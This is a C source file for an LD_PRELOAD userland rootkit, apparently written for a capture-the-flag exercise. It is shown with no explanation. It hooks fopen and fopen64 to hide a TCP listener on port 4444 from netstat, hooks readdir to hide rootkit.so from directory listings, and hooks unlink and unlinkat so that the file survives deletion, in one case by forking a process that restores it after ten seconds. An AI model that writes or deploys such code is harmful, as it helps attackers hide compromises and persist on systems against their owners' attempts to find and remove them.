#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <dirent.h>
#include <unistd.h>


//============================================================
FILE *(*new_fopen64)(const char *pathname , const char *mode);

FILE *fopen64(const char *pathname , const char *mode){
	new_fopen64 = dlsym(RTLD_NEXT , "fopen64");
	
	char *ptr_tcp = strstr(pathname , "/proc/net/tcp");
	
	FILE *fp;
	
	if( ptr_tcp != NULL){
		char line[256];
		FILE *temps = tmpfile();
		fp = new_fopen64(pathname , mode);
		while(fgets(line , sizeof(line) , fp)){
			char *listener = strstr(line ,"115C");
				//printf("%s",line);
				if( listener != NULL){ 
					continue; 
				}
				else{ 
				fputs(line, temps);
				}
			}
		return temps;
	}
	fp = new_fopen64(pathname  , mode);
	return fp;
}
								 // Hidden from netstat 
FILE *(*new_fopen)(const char *pathname , const char *mode);

FILE *fopen(const char *pathname , const char *mode){
	new_fopen = dlsym(RTLD_NEXT , "fopen");
	
	char *ptr_tcp = strstr(pathname , "/proc/net/tcp");
	
	FILE *fp;
	
	if( ptr_tcp != NULL){
		char line[256];
		FILE *temps = tmpfile();
		fp = new_fopen(pathname , mode);
		while(fgets(line , sizeof(line) , fp)){
			char *listener = strstr(line ,"115C");
				//printf("%s",line);
				if( listener != NULL){ 
					continue; 
				}
				else{ 
				fputs(line, temps);
				}
			}
		return temps;
	}
	fp = new_fopen(pathname  , mode);
	return fp;
}
//=============================================================


/*
ssize_t write(int fildes, const void *buf , size_t nbytes){

	ssize_t (*new_write)(int fildes, const void *buf , size_t nbytes);
	
	ssize_t result;
	new_write = dlsym(RTLD_NEXT , "write");
	
	if(strcmp(buf , "/home/ctf/Desktop/Back_To_Basics/rootkit.so") == 0){
		char buf_tmp[] = "\0";
		new_write(fildes , buf_tmp , strlen(buf_tmp));
	}
	else{
	
	new_write(fildes , buf , nbyte);
	}
result =1;
return result;
}
*/
//=============================================================

#define FILENAME "rootkit.so"

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp){
	old_readdir = dlsym(RTLD_NEXT , "readdir");
	
	struct dirent *dir;
								// Cannot see rootkit.so using LS
	while (dir = old_readdir(dirp)){
		if(strstr(dir->d_name , FILENAME) == 0) break;
	}
	return dir;
}

//=============================================================
int Delete_Restore(int dirfd , const char *pathname , int flags); // function prototype cause i'm too lazy to move the function upwards

int (*new_unlinkat)(int dirfd , const char *pathname , int flags);

int unlinkat(int dirfd , const char *pathname , int flags){
	new_unlinkat = dlsym(RTLD_NEXT , "unlinkat");
	int result;
	if(strstr(pathname , "rootkit.so")){
		result = Delete_Restore(dirfd , pathname , flags);
		
	}
	else{
	result = new_unlinkat(dirfd , pathname , flags);
	}
	
return result;							// Remove ability to delete the rootkit using rm with syscall unlink & unlinkat 
}
int (*new_unlink)(const char *pathname);
int unlink(const char *pathname){
	new_unlink = dlsym(RTLD_NEXT , "unlink");
	int result;
	if(strstr(pathname , "rootkit.so")){
		return 0;
	}
	else{
	result = new_unlink(pathname);
	}
return result;
}
//============================================================
	
int Delete_Restore(int dirfd , const char *pathname , int flags){
	FILE *input_file = fopen(pathname ,"rb");
	fseek(input_file , 0 , SEEK_END);
	int result;
	long file_size = ftell(input_file);
	rewind(input_file);
	
	unsigned char *buffer = (unsigned char*)malloc(file_size);
	if( buffer == NULL){ 
			     perror("Error allocating memory"); 
			     fclose(input_file);
			     return -1; //fool the system that the file doesnt exist to avoid removing it			  
	}	
	size_t bytes_read = fread(buffer , 1 , file_size , input_file);
	
	if(bytes_read != file_size) {
					perror("Error reading file");
					free(buffer);
					fclose(input_file);
					return -1;
	}
	
	fclose(input_file);
	pid_t pid = fork();
	
	if(pid != 0){	
	free(buffer);
	result = new_unlinkat(dirfd , pathname , flags);
	return result;
	}
	else{
	sleep(10);
	
	FILE *output_file = fopen(pathname , "wb");
	if(output_file == NULL){
		perror("Error opening output file , program was deleted and cant be restored");
		free(buffer);
		exit(0);
	}
	
	size_t bytes_written = fwrite(buffer , 1 , file_size , output_file);
	if ( bytes_written != file_size){
					perror("Couldnt write to file");
					free(buffer);
					exit(0);
	}
	fclose(output_file);
	free(buffer);
	exit(0);
		
	}
	return 0;
}

